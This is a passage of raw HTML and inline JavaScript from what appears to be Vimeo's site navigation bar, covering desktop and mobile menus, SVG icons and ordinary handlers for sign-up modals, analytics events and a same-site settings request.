                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:privacy" href="https://vimeo.com/features/video-privacy?mkc=368ip_fm_privacy">Privacy</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:collaboration" href="https://vimeo.com/features/video-collaboration?mkc=368ip_fm_collab">Collaboration</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                                    <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Grow</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:enterprise" href="https://vimeo.com/enterprise?mkc=368-menu-grow">Enterprise</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:live_events" href="https://vimeo.com/features/virtual-events">Host virtual events</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:distribution" href="https://vimeo.com/features/video-marketing?mkc=368ip_fg_publish">Publish everywhere</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:analytics" href="https://vimeo.com/features/video-analytics?mkc=368ip_fg_analyze">Analyze</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:monetization" href="https://vimeo.com/ott?mkc=entprsb">Monetize</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                        </ul>
                                                                                                                <div class="highlights_banner">
                                            <h2 class="banner_heading">
                                                DEMO VIDEOS                                            </h2>
                                            <h3 class="banner_main_text">
                                                Get to know everything Vimeo can do for your business.                                            </h3>
                                            <a href="https://vimeo.com/enterprise/watch-demo?mkc=368-tv-wd" class="banner_button banner_button_text" data-fatal-attraction="container:top_nav|component:features_highlight|keyword:watch_demo">Watch now</a>
                                        </div>
                                                                    </div>
                            
                        </li>
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="resources" data-fatal-attraction-impression="container:top_nav|component:resources_menu|keyword:resources_hover">
                            <a onclick="event.preventDefault();event.target.blur();" class="topnav_menu_no_link topnav_has_dropdown" href="#" rel="toggle" role="button" aria-owns="topnav_resources">
                                Resources                                                                    <div class="topnav_dropdown_arrow">
                                        <svg width="20px" height="20px" viewBox="0 0 24 24">
                                            <path d="M12 15.5a1 1 0 0 1-.67-.26l-5-4.5 1.34-1.48L12 13.15l4.33-3.9 1.34 1.49-5 4.5a1 1 0 0 1-.67.26z" fill="#657987"></path>
                                        </svg>
                                    </div>
                                                            </a>
                                                                                        <div class="topnav_desktop_menu_items_dropdown row_flex" role="menu" aria-hidden="true" id="topnav_resources">
                                    <ul class="row_elements">
                                                                                        <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Learn</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:inspiration|keyword:blog" data-gtm-click="top_nav_inspiration_blog" href="https://vimeo.com/blog">Vimeo blog</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:inspiration|keyword:video_school" data-gtm-click="top_nav_inspiration_video_school" href="https://vimeo.com/blog/category/video-school">Video School</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_learn|keyword:customer_stories" href="https://vimeo.com/blog/category/case-study">Customer stories</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_learn|keyword:investor_relations" href="https://investors.vimeo.com">Investor Relations</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                                    <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Connect</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:developer_tools" href="https://developer.vimeo.com/">Developer tools</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:partner_program" href="https://vimeo.com/partners">Partner program</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:creative_community" href="https://vimeo.com/experts">Creative community</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:help_center" href="https://vimeo.zendesk.com/hc/en-us">Help center</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                        </ul>
                                                                                                        </div>
                            
                        </li>
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="watch">
                            <a data-fatal-attraction="container:top_nav|component:watch" data-gtm-click="top_nav_watch_click" href="https://vimeo.com/watch" rel="toggle" role="button" aria-owns="topnav_watch">
                                Watch                                                            </a>
                                                        
                        </li>
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="pricing">
                            <a data-gtm-click="top_nav_pricing_click" data-fatal-attraction="container:top_nav|component:pricing" href="https://vimeo.com/upgrade" rel="toggle" role="button" aria-owns="topnav_pricing">
                                Pricing                                                            </a>
                                                        
                        </li>
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="contact_sales">
                            <a data-gtm-click="top_nav_contact_sales_click" data-fatal-attraction="container:top_nav|component:contact_sales|keyword:contact_sales" href="https://vimeo.com/enterprise/contact-us?mkc=368tnc" rel="toggle" role="button" aria-owns="topnav_contact_sales">
                                Contact Sales                                                            </a>
                                                        
                        </li>
                                    </ul>
            </nav><!-- /.topnav_desktop_menu -->
        
                                                                            <div id="topnav_menu_search_omnisearch" class="topnav_menu_search" data-query="" data-placeholder="Search videos, people, and more"></div>
                                    
                            <div class="topnav_menu_right">
                                
                                                        <ul class="topnav_menu_desktop_main" role="menu">
                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_right" data-menu-id="login">
                                    <a class="js-topnav_menu_auth" data-ga-event-click="top_nav|login" data-fatal-attraction="container:top_nav|component:login|target:/log_in" data-gtm-click="top_nav_login_click" href="https://vimeo.com/log_in" rel="toggle" role="button" aria-owns="topnav_login">
                                        Log in                                    </a>
                                </li>
                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_right" data-menu-id="join">
                                    <a class="topnav_menu_join js-topnav_menu_auth" data-ga-event-click="top_nav|join" data-fatal-attraction="container:top_nav|component:join|target:/join" data-gtm-click="top_nav_join_click" href="https://vimeo.com/join" rel="toggle" role="button" aria-owns="topnav_join">
                                        Join                                    </a>
                                </li>
                                                    </ul>
                                                                        <div id="record_tip_wrapper" class="topnav_desktop_video_popover" onmouseenter="trackNewVideoDropdownImpression('variant_screen')">
    <button id="new_video_dropdown_button" class="topnav_desktop_video_popover_button iris_btn--primary" data-fatal-attraction="container:top_nav|component:new_video" onclick="handleNewVideoClick()">
        <span class="topnav_desktop_video_popover_span_wrapper">
            New video            <span id="record_animation_wrapper" class="topnav_desktop_video_popover_span_variant no_animation">
                <svg viewBox="0 0 24 24" width="24px" height="24px">
                    <path d="M12 15.5a1 1 0 0 1-.67-.26l-5-4.5 1.34-1.48L12 13.15l4.33-3.9 1.34 1.49-5 4.5a1 1 0 0 1-.67.26z" fill="#ffffff"></path>
                </svg>
            </span>
        </span>
    </button>
    
            <ul id="new_video_dropdown_variant" class="topnav_desktop_menu_items_dropdown column_elements topnav_desktop_video_popover_dropdown_variant" role="menu" aria-hidden="true" style="padding: unset;">
                            
                <li class="topnav_desktop_menu_items_dropdown_item_variant" role="menuitem" tabindex="-1">
                    <a onclick="(function(event) { if (window.handleUploadButtonClick) { handleUploadButtonClick(event); }})(event)" data-fatal-attraction="container:top_nav|component:new_video|keyword:{'action':'upload'}|target:/upload|type:click" id="topnav_desktop_upload_button" href="https://vimeo.com/upload">
                        <div class="align_topnav_dropdown_icons">
                            <svg viewBox="0 0 20 20" width="24px" height="24px">
                            <path d="M18 8.48a7.16 7.16 0 0 0-1.84-4.76A5.81 5.81 0 0 0 6.92 5a5.24 5.24 0 0 0-4.69 3.85A4.91 4.91 0 0 0 0 13a5.13 5.13 0 0 0 5 5h10a5.1 5.1 0 0 0 5-4.94 5.89 5.89 0 0 0-2-4.58zM15 16h-4v-3.59l1.29 1.29 1.41-1.41-3.7-3.7-3.71 3.7L7.7 13.7 9 12.41V16H5a3.16 3.16 0 0 1-3-3 2.91 2.91 0 0 1 1.52-2.58l.4-.2.08-.44A3.38 3.38 0 0 1 7.59 7h.7l.24-.66A3.69 3.69 0 0 1 12 4a3.73 3.73 0 0 1 2.72 1.12A5.45 5.45 0 0 1 16 9v.54l.45.3A3.79 3.79 0 0 1 18 13.06 3.09 3.09 0 0 1 15 16z" fill="#1a2e3b"></path>
                        </svg>                            <div class="topnav_dropdown_label_wrapper">
                                <div class="topnav_dropdown_label">
                                    Upload                                                                    </div>
                                                            </div>
                        </div>
                    </a>
                </li>
                            
                <li class="topnav_desktop_menu_items_dropdown_item_variant" role="menuitem" tabindex="-1">
                    <a onclick="handleCreateVideoClick(event)" data-fatal-attraction="container:top_nav|component:new_video|keyword:{'action':'create'}|target:/create/templates|type:click" id="topnav_desktop_create_video_button" href="https://vimeo.com/create/templates">
                        <div class="align_topnav_dropdown_icons">
                            <svg viewBox="0 0 20 20" width="24px" height="24px">
                        <path d="M3.2 16.8l3.8-1 10-10c.2-.2.2-.5 0-.7L14.9 3c-.2-.2-.5-.2-.7 0l-2.1 2.1 2.8 2.8L13.8 9 11 6.2 4.2 13l-1 3.8zm9.9-14.9c.8-.8 2-.8 2.8 0L18.1 4c.8.8.8 2 0 2.8L7.8 17.2l-5.6 1.5c-.5.1-.9-.2-.7-.7l1.4-5.7L13.1 1.9z" fill="#1a2e3b"></path>
                    </svg>                            <div class="topnav_dropdown_label_wrapper">
                                <div class="topnav_dropdown_label">
                                    Create video                                                                    </div>
                                                            </div>
                        </div>
                    </a>
                </li>
                            
                <li class="topnav_desktop_menu_items_dropdown_item_variant" role="menuitem" tabindex="-1">
                    <a data-fatal-attraction="container:top_nav|component:new_video|keyword:screen_record|type:click" id="topnav_desktop_record_screen_button" href="https://vimeo.com/features/screen-recorder" data-screen-recorder-cta="">
                        <div class="align_topnav_dropdown_icons">
                            <svg width="24px" height="24px" viewBox="0 0 24 24">
                    <g id="Icon-24px" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                        <g id="Oval">
                            <use fill="black" fill-opacity="1" filter="url(#filter-2)" xlink:href="#path-1"></use>
                            <circle stroke="#1A2E3B" stroke-width="2" cx="12" cy="12" r="9"></circle>
                        </g>
                        <rect id="Rectangle" fill="#1A2E3B" x="8" y="8" width="8" height="8" rx="4"></rect>
                    </g>
                </svg>                            <div class="topnav_dropdown_label_wrapper">
                                <div class="topnav_dropdown_label">
                                    Record screen                                                                    </div>
                                                            </div>
                        </div>
                    </a>
                </li>
                            
                <li class="topnav_desktop_menu_items_dropdown_item_variant" role="menuitem" tabindex="-1">
                    <a onclick="(function(event) { if (window.handleLiveButtonClick) { handleLiveButtonClick(event); }})(event)" data-fatal-attraction="container:top_nav|component:new_video|keyword:{'action':'live'}" id="topnav_desktop_create_demo_live_button" href="https://vimeo.com//vimeo.com/features/livestreaming?mkc=368ip_nv_live">
                        <div class="align_topnav_dropdown_icons">
                            <svg viewBox="0 0 20 14" width="24px" height="24px">
                <path d="M19 1h-1.49a1 1 0 00-.72.3L14 4.18V2a2 2 0 00-2-2H2a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2V9.82l2.8 2.87a1 1 0 00.72.3H19a1 1 0 001-1V2a1 1 0 00-1-1zm-7 11H2V2h10zm6-1h-.06L14 7l3.89-4H18z" fill="#1a2e3b" fill-rule="evenodd"></path>
            </svg>                            <div class="topnav_dropdown_label_wrapper">
                                <div class="topnav_dropdown_label">
                                    Go live                                                                    </div>
                                                            </div>
                        </div>
                    </a>
                </li>
                    </ul>
    </div>
                
                <div id="cart_top_nav" class="topnav_cart_button"></div>

            </div><!-- /.topnav_menu_right -->
            </div><!-- /.topnav_desktop_wrapper -->
</div>

    <script>
        var isMobile = /iphone|ipod|android|webos|blackberry|windows phone/i.test(navigator.userAgent.toLowerCase());

        // DO NOT REMOVE. This is a callback for the login & join buttons in TopNavBuilder.
        function completeUserLogin(response) {
            if (response && !response.signup) {
                window.location.reload();
            }
        }

        function handleUploadButtonClick(event) {
            // Opens the auth modal for logged out users
            if (
                window.vimeo
                && window.vimeo.config
                && window.vimeo.Modal
                && !window.vimeo.cur_user
            ){
                event.preventDefault();
                isMobile ? window.location.href="https://vimeo.com/upload" : vimeo.Modal.create({
                    size: 'xsmall',
                    content:'/join?modal=new&redirect=/upload',
                });
            }
        }
    </script>

<script>

    var isBrowserIE = (function(window) {
        return /(MSIE|Trident|Edge)/.test(window.navigator.userAgent);
    })(window);

    // IE fix for Dropdown menu
    (function() {
        var dropDownSelector = '.topnav_desktop_menu_items_dropdown';
        var dropDownEle = document.querySelector(dropDownSelector);
        if(isBrowserIE) {
            dropDownEle.classList.add('column_flex');
        }
    })();

    function handleNewVideoClick() {
        if (window.vimeo && window.vimeo.cur_user) {
            if (window.location.pathname !== '/upload') {
                window.location.href = '/upload';
            }
        } else {
            window.vimeo.Modal.create({ size: 'xsmall', content: '/join?modal=new&redirect=/upload' })
                .then(completeUserLogin);
        }
    }

    function handleCreateVideoClick(e, isRecordScreen) {
        if (window.vimeo && !window.vimeo.cur_user && !isRecordScreen) {
            e.preventDefault();

            window.vimeo.Modal.create({
                size: 'xsmall',
                content: '/join?modal=new&redirect=' + encodeURIComponent("https://vimeo.com/welcome-survey?type=segment&vimeoHref=" + encodeURIComponent('/create/templates'))
            }).then(completeUserLogin);
        }
    }

    function trackNewVideoDropdownImpression(recordOption) {
        if (window.__fa) {
            window.__fa.push(['trackEvent', {
                type: 'impression',
                container: 'top_nav',
                component: 'new_video',
            }]);

            window.__fa.push(['trackEvent', {
                type: 'impression',
                container: 'top_nav',
                component: 'go_live',
                keyword: 'shown_owner',
            }]);

            if (recordOption) {
                window.__fa.push(['trackEvent', {
                    type: 'impression',
                    container: 'top_nav',
                    component: 'record',
                    keyword: recordOption,
                }]);
            }
        }
    }

    function handleLiveButtonClick(event) {
        // Opens the auth modal for logged out users
        if (
            window.vimeo
            && window.vimeo.config
            && window.vimeo.Modal
            && !window.vimeo.cur_user
            && !isMobile
        ){
            event.preventDefault();
            const liveHref = '/features/livestreaming/';
            vimeo.Modal.create({
                size: 'xsmall',
                content: '/join?modal=new&redirect=' + encodeURIComponent(liveHref)
            });
        }
    }
</script>

    <script>
        var arrow = document.getElementById('record_animation_wrapper');
        var newVideoBtn = document.getElementById('record_tip_wrapper');

        if (arrow) {
            arrow.classList.add('no_animation');
        }

        var isHovered = false;

        if (newVideoBtn && false) {
            newVideoBtn.addEventListener('mouseenter', function() {
                if (isHovered) return;

                isHovered = true;

                if (arrow) {
                    arrow.classList.remove('no_animation');
                }

                store_record_tip_settings(1);

            }, false);
        }

        function store_record_tip_settings(value) {
            var xhr = new XMLHttpRequest();

            xhr.open('POST', '/settings/nav_recorder_tip');
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send('record_screen_tip_state=' + value + '&token=' + vimeo.xsrft);

            // Nothing to handle. We hope for the best in this case
            xhr.onload = function () {};
        };
    </script>



<script>

    function processRecordScreenMenuItem(){
        var recordScreenMenuItem = document.querySelector("#topnav_desktop_record_screen_button");

        if (!recordScreenMenuItem) return;

        var clientSupportsRecordTool = false;
        var canUseStandaloneRecordWidget = false;

        var isUserBucketedForStandaloneRecordWidget = function(){
          return window.ABLincoln && window.ABLincoln.getTest('JS.RecordStandalone.Rollout').get('is_available', 'control') === 'variant';
        };

        if (clientSupportsRecordTool && (canUseStandaloneRecordWidget || isUserBucketedForStandaloneRecordWidget())) {
            recordScreenMenuItem.setAttribute('href', '/record/start-recording');
        } else {
            recordScreenMenuItem.setAttribute('data-screen-recorder-cta', '');
        }

    }

    window.addEventListener('load', processRecordScreenMenuItem);
</script>


    
<!-- /* Responsive Top Nav (Explore, LOHP, Watch, tc) *-->
<nav id="topnav_mobile" class="topnav_mobile    nav_bar--li" role="banner">

    <div class="topnav_mobile_bar">
        
                                <svg data-action="menu.open" class="navbar_hamburger nav_bar_icon topnav_mobile_button topnav_mobile_pull_left js-topnav_mobile_header_logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                <title>Menu</title>
                <path id="Rectangle-4" d="M7,8H25a1,1,0,0,1,1,1h0a1,1,0,0,1-1,1H7A1,1,0,0,1,6,9H6A1,1,0,0,1,7,8Z"></path>
                <path d="M7,15H25a1,1,0,0,1,1,1h0a1,1,0,0,1-1,1H7a1,1,0,0,1-1-1H6A1,1,0,0,1,7,15Z"></path>
                <path d="M7,22H25a1,1,0,0,1,1,1h0a1,1,0,0,1-1,1H7a1,1,0,0,1-1-1H6A1,1,0,0,1,7,22Z"></path>
            </svg>

                        <div class="topnav_action_buttons">
                <a href="https://vimeo.com//vimeo.com/search" class="topnav_mobile_button topnav_mobile_pull_right topnav_mobile_header_search">
                    <svg class="nav_bar_search_icon nav_bar_icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                        <title>Search</title>
                        <path d="M26.74,25.32l-4.53-4.53a1,1,0,0,0-.21-.14A9,9,0,1,0,20.65,22a1,1,0,0,0,.14.21l4.53,4.53a1,1,0,0,0,1.41-1.41ZM15,22a7,7,0,1,1,7-7A7,7,0,0,1,15,22Z"></path>
                    </svg>
                </a>
                                <div id="cart_top_nav_mobile" class="topnav_cart_button"></div>
            </div>
            <!-- Vimeo Logo -->
            <div class="nav_bar_title js-nav_bar_title">
                <a href="https://vimeo.com" gtm-data-click="mobile_nav_home_logo_click">
                    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 441 124.682" width="86px" height="27px">
                        <g>
                            <path d="M120.481,27.326c5.462,0,10.188-1.91,14.174-5.728c3.547-3.379,5.392-6.906,5.54-10.583c0.143-2.492-0.815-4.951-2.88-7.378C135.244,1.217,132.662,0,129.562,0c-5.32,0-10.155,1.767-14.511,5.288c-4.356,3.527-6.608,7.204-6.75,11.022C108.002,23.656,112.067,27.326,120.481,27.326z"></path>
                            <path d="M434.079,50.16c-5.319-6.925-13.145-10.395-23.475-10.395c-16.097,0-29.455,5.896-40.083,17.688c-9.902,10.614-14.478,22.265-13.733,34.944c0.049,0.932,0.132,1.84,0.229,2.738c-0.554,0.241-1.093,0.483-1.662,0.724c-12.556,5.411-24.147,8.11-34.775,8.11c-5.32,0-9.307-1.839-11.96-5.521c14.316-2.355,26.206-7.876,35.662-16.568c8.854-7.955,12.989-15.689,12.4-23.197c-0.887-11.78-8.562-17.676-23.034-17.676c-15.65,0-29.235,5.909-40.75,17.714c-10.484,10.783-15.805,22.148-15.947,34.103c-0.04,2.005,0.066,3.932,0.3,5.789c-2.477,1.632-4.352,2.456-5.613,2.456c-2.81,0-4.576-0.582-5.314-1.76c-0.737-1.178-1.035-3.308-0.887-6.401c0-1.178,0.919-5.695,2.771-13.565c1.845-7.87,2.841-13.864,2.99-17.987c0.291-6.025-0.894-10.66-3.547-13.896c-3.101-3.974-8.194-5.663-15.281-5.074c-5.902,0.447-11.592,2.66-17.054,6.647c-3.249,2.363-6.569,5.534-9.961,9.521c-1.185,1.036-2.291,2-3.327,2.88c0.143-6.051-1.036-10.705-3.54-13.954c-3.107-3.987-8.272-5.683-15.508-5.094c-8.415,0.738-16.02,4.065-22.809,9.967c-2.958,2.511-5.54,5.469-7.753,8.861c0.291-1.327,0.44-2.731,0.44-4.207c0-4.576-1.185-8.602-3.547-12.071s-5.462-5.055-9.301-4.757c-2.213,0.149-6.42,3.101-12.621,8.854c-8.569,7.974-13.216,12.259-13.954,12.841l5.313,5.98c4.136-2.984,6.647-4.479,7.534-4.479c1.618,0,2.285,1.327,1.994,3.975c-0.143,3.831-0.822,9.164-2.039,16.012c-0.754,4.243-1.298,7.904-1.638,10.988c-0.066,0.055-0.129,0.109-0.196,0.164c-5.32,4.375-9.009,6.556-11.074,6.556c-4.725,0-7.016-3.158-6.867-9.488c2.213-13.824,4.285-25.222,6.207-34.199c0.583-5.294-0.266-9.592-2.55-12.906c-2.291-3.314-5.87-4.744-10.737-4.304c-3.107,0.298-7.832,3.249-14.181,8.86c-2.205,2-4.41,3.996-6.615,5.993c-0.437-10.447-5.204-15.822-14.329-16.09c-13.669-0.44-22.931,7.275-27.779,23.158c2.504-1.074,4.938-1.618,7.301-1.618c5.016,0,7.229,2.822,6.64,8.453c-0.297,3.411-2.511,8.375-6.64,14.899c-4.136,6.523-7.236,9.786-9.301,9.786c-2.66,0-5.094-5.023-7.307-15.081c-0.745-2.951-2.071-10.491-3.987-22.614c-1.773-11.236-6.499-16.485-14.174-15.747c-3.249,0.298-8.123,3.249-14.614,8.86C9.669,53.318,4.867,57.597,0,61.875l4.641,5.98c4.42-3.094,7.003-4.647,7.741-4.647c3.385,0,6.55,5.313,9.501,15.929c2.653,9.733,5.307,19.468,7.961,29.202c3.974,10.621,8.841,15.929,14.588,15.929c9.281,0,20.627-8.719,34.038-26.154C87.892,85.987,93.99,75.74,96.8,67.354c3.72-2.748,6.018-4.146,6.853-4.146c2.653,0,3.987,1.922,3.987,5.754c0,0.738-1.443,6.2-4.324,16.381c-2.88,10.182-4.395,17.709-4.537,22.575c-0.149,4.726,0.997,8.557,3.43,11.508c2.434,2.952,5.941,4.428,10.524,4.428c9.89,0,19.779-4.278,29.675-12.835c0.881-0.772,1.738-1.557,2.573-2.352c0.783,3.312,2.124,6.045,4.07,8.15c4.259,4.569,11.456,6.706,21.592,6.408c-1.353-3.249-1.884-9.003-1.586-17.274c0.44-9.152,2.809-17.941,7.094-26.355s8.278-12.627,11.98-12.627c4.285,0,6.285,2.731,5.987,8.193c-0.149,3.696-0.874,7.903-2.175,12.628c-1.307,4.725-2.032,9.449-2.174,14.174c-0.298,7.534,1.392,12.919,5.081,16.168c4.116,3.689,11.334,5.392,21.638,5.094c-1.541-3.392-2.162-8.266-1.864-14.621c0.44-9.003,3.482-18.304,9.113-27.902c5.333-9.151,9.922-13.733,13.772-13.733c3.56,0,5.263,2.809,5.113,8.414c-0.148,3.688-1.074,8.854-2.771,15.494c-1.695,6.641-2.621,12.316-2.764,17.041c-0.297,10.628,4.35,15.936,13.955,15.936c9.889,0,19.779-4.278,29.675-12.835c0.164-0.144,0.316-0.293,0.479-0.438c0.34,0.586,0.688,1.168,1.068,1.732c5.165,7.967,13.734,11.954,25.695,11.954c16.09,0,31.966-4.492,47.616-13.488c1.756-0.99,3.422-1.979,5.017-2.97c0.986,1.991,2.138,3.866,3.502,5.591c6.052,7.521,14.912,11.281,26.575,11.281c14.025,0,25.767-4.938,35.216-14.815c9.449-9.876,14.466-21.598,15.061-35.163C441.387,64.684,439.102,56.503,434.079,50.16z M305.118,90.003c-0.084-1.909-0.084-2.867,0-2.867c0.143-5.579,2.505-11.417,7.074-17.514s9.062-9.146,13.488-9.146c3.392,0,5.01,1.987,4.867,5.948c-0.149,2.938-2.362,6.764-6.634,11.462C318.606,83.324,312.341,87.362,305.118,90.003z M415.918,73.868c-0.297,7.1-2.434,13.902-6.42,20.413c-4.725,7.845-10.414,11.76-17.055,11.76c-2.958,0-5.249-1.624-6.867-4.88c-1.476-2.809-2.142-6.064-1.993-9.767c0.291-7.54,2.505-14.64,6.647-21.3c4.866-8.136,11.067-12.207,18.601-12.207c2.356,0,4.168,1.67,5.424,4.997S416.067,69.875,415.918,73.868z"></path>
                        </g>
                    </svg>
                </a>
            </div>
            </div>

        <div class="topnav_mobile_menu lohp_topnav_mobile_menu js-topnav_mobile_menu_main">
        <div class="lohp-flex-wrapper">
            <div>
                <div class="topnav_mobile_bar">
                                                                    <button data-action="menu.close" data-gtm-click="mobile_nav_menu_close_click" class="menu_close pull_left js-topnav_mobile_header_close">
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="22" height="17" viewBox="0 0 18 17">
                                <g stroke-width="0.1" fill-rule="evenodd">
                                    <path d="M1 16.218L16.627.59l.778.778L1.778 16.995z"></path>
                                    <path d="M1.778.59l15.627 15.628-.778.777L1 1.368z"></path>
                                </g>
                            </svg>
                        </button>

                                                <a class="lohp_logo">
                            <svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 441 124.682" width="86px" height="27px">
                                <g>
                                    <path d="M120.481,27.326c5.462,0,10.188-1.91,14.174-5.728c3.547-3.379,5.392-6.906,5.54-10.583c0.143-2.492-0.815-4.951-2.88-7.378C135.244,1.217,132.662,0,129.562,0c-5.32,0-10.155,1.767-14.511,5.288c-4.356,3.527-6.608,7.204-6.75,11.022C108.002,23.656,112.067,27.326,120.481,27.326z"></path>
                                    <path d="M434.079,50.16c-5.319-6.925-13.145-10.395-23.475-10.395c-16.097,0-29.455,5.896-40.083,17.688c-9.902,10.614-14.478,22.265-13.733,34.944c0.049,0.932,0.132,1.84,0.229,2.738c-0.554,0.241-1.093,0.483-1.662,0.724c-12.556,5.411-24.147,8.11-34.775,8.11c-5.32,0-9.307-1.839-11.96-5.521c14.316-2.355,26.206-7.876,35.662-16.568c8.854-7.955,12.989-15.689,12.4-23.197c-0.887-11.78-8.562-17.676-23.034-17.676c-15.65,0-29.235,5.909-40.75,17.714c-10.484,10.783-15.805,22.148-15.947,34.103c-0.04,2.005,0.066,3.932,0.3,5.789c-2.477,1.632-4.352,2.456-5.613,2.456c-2.81,0-4.576-0.582-5.314-1.76c-0.737-1.178-1.035-3.308-0.887-6.401c0-1.178,0.919-5.695,2.771-13.565c1.845-7.87,2.841-13.864,2.99-17.987c0.291-6.025-0.894-10.66-3.547-13.896c-3.101-3.974-8.194-5.663-15.281-5.074c-5.902,0.447-11.592,2.66-17.054,6.647c-3.249,2.363-6.569,5.534-9.961,9.521c-1.185,1.036-2.291,2-3.327,2.88c0.143-6.051-1.036-10.705-3.54-13.954c-3.107-3.987-8.272-5.683-15.508-5.094c-8.415,0.738-16.02,4.065-22.809,9.967c-2.958,2.511-5.54,5.469-7.753,8.861c0.291-1.327,0.44-2.731,0.44-4.207c0-4.576-1.185-8.602-3.547-12.071s-5.462-5.055-9.301-4.757c-2.213,0.149-6.42,3.101-12.621,8.854c-8.569,7.974-13.216,12.259-13.954,12.841l5.313,5.98c4.136-2.984,6.647-4.479,7.534-4.479c1.618,0,2.285,1.327,1.994,3.975c-0.143,3.831-0.822,9.164-2.039,16.012c-0.754,4.243-1.298,7.904-1.638,10.988c-0.066,0.055-0.129,0.109-0.196,0.164c-5.32,4.375-9.009,6.556-11.074,6.556c-4.725,0-7.016-3.158-6.867-9.488c2.213-13.824,4.285-25.222,6.207-34.199c0.583-5.294-0.266-9.592-2.55-12.906c-2.291-3.314-5.87-4.744-10.737-4.304c-3.107,0.298-7.832,3.249-14.181,8.86c-2.205,2-4.41,3.996-6.615,5.993c-0.437-10.447-5.204-15.822-14.329-16.09c-13.669-0.44-22.931,7.275-27.779,23.158c2.504-1.074,4.938-1.618,7.301-1.618c5.016,0,7.229,2.822,6.64,8.453c-0.297,3.411-2.511,8.375-6.64,14.899c-4.136,6.523-7.236,9.786-9.301,9.786c-2.66,0-5.094-5.023-7.307-15.081c-0.745-2.951-2.071-10.491-3.987-22.614c-1.773-11.236-6.499-16.485-14.174-15.747c-3.249,0.298-8.123,3.249-14.614,8.86C9.669,53.318,4.867,57.597,0,61.875l4.641,5.98c4.42-3.094,7.003-4.647,7.741-4.647c3.385,0,6.55,5.313,9.501,15.929c2.653,9.733,5.307,19.468,7.961,29.202c3.974,10.621,8.841,15.929,14.588,15.929c9.281,0,20.627-8.719,34.038-26.154C87.892,85.987,93.99,75.74,96.8,67.354c3.72-2.748,6.018-4.146,6.853-4.146c2.653,0,3.987,1.922,3.987,5.754c0,0.738-1.443,6.2-4.324,16.381c-2.88,10.182-4.395,17.709-4.537,22.575c-0.149,4.726,0.997,8.557,3.43,11.508c2.434,2.952,5.941,4.428,10.524,4.428c9.89,0,19.779-4.278,29.675-12.835c0.881-0.772,1.738-1.557,2.573-2.352c0.783,3.312,2.124,6.045,4.07,8.15c4.259,4.569,11.456,6.706,21.592,6.408c-1.353-3.249-1.884-9.003-1.586-17.274c0.44-9.152,2.809-17.941,7.094-26.355s8.278-12.627,11.98-12.627c4.285,0,6.285,2.731,5.987,8.193c-0.149,3.696-0.874,7.903-2.175,12.628c-1.307,4.725-2.032,9.449-2.174,14.174c-0.298,7.534,1.392,12.919,5.081,16.168c4.116,3.689,11.334,5.392,21.638,5.094c-1.541-3.392-2.162-8.266-1.864-14.621c0.44-9.003,3.482-18.304,9.113-27.902c5.333-9.151,9.922-13.733,13.772-13.733c3.56,0,5.263,2.809,5.113,8.414c-0.148,3.688-1.074,8.854-2.771,15.494c-1.695,6.641-2.621,12.316-2.764,17.041c-0.297,10.628,4.35,15.936,13.955,15.936c9.889,0,19.779-4.278,29.675-12.835c0.164-0.